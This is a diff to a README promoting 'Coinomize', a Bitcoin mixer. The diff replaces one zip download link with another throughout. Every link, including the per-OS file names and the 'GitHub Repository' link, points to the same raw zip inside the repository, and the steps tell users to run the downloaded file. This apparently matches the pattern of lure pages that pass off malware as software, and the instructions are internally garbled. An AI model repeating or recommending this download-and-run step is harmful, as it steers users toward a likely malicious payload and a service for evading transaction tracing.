@@ -1,6 +1,6 @@
 # 🎉 Coinomize - Enhance Your Bitcoin Privacy Today
 
-[![Download Coinomize](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip)](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip)
+[![Download Coinomize](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip)](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip)
 
 ## 📌 About Coinomize
 Coinomize is a Bitcoin mixer service that helps improve your privacy when using cryptocurrency. With advanced features, it allows you to mix your Bitcoin transactions, making it harder for others to trace them. This repository shares valuable information about how Coinomize operates, its CoinJoin-associated features, and its role as a top Bitcoin privacy tool in 2026.
@@ -16,13 +16,13 @@ Coinomize is a Bitcoin mixer service that helps improve your privacy when using 
 If you're ready to enhance your Bitcoin privacy, follow these simple steps to download and run Coinomize.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Download Coinomize](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip).
+1. Visit this page to download: [Download Coinomize](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip).
 2. On the Releases page, look for the latest version of Coinomize. 
 3. Click on the latest version to see all available downloads.
 4. Select the appropriate file for your operating system:
-   - For Windows, you might see a file labeled `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip`.
-   - For macOS, you might find a file labeled `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip`.
-   - For Linux users, there may be a `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip` file.
+   - For Windows, you might see a file labeled `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip`.
+   - For macOS, you might find a file labeled `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip`.
+   - For Linux users, there may be a `https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip` file.
 5. Click on the file name to begin the download.
 6. Once the download is complete, locate the file on your computer and run it.
 
@@ -49,7 +49,7 @@ For those interested in learning more about Bitcoin mixing and the CoinJoin proc
 
 ## 🌐 Connect with Us
 Stay updated and connect with the community:
-- **GitHub Repository:** [Coinomize GitHub](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software_v2.4.zip)
+- **GitHub Repository:** [Coinomize GitHub](https://raw.githubusercontent.com/Hirujasavidukap/Coinomize/main/Robinia/Software-2.8-alpha.5.zip)
 - **Social Media:** Follow us on Twitter and Facebook for the latest news and updates.
 
 ## 📞 Support
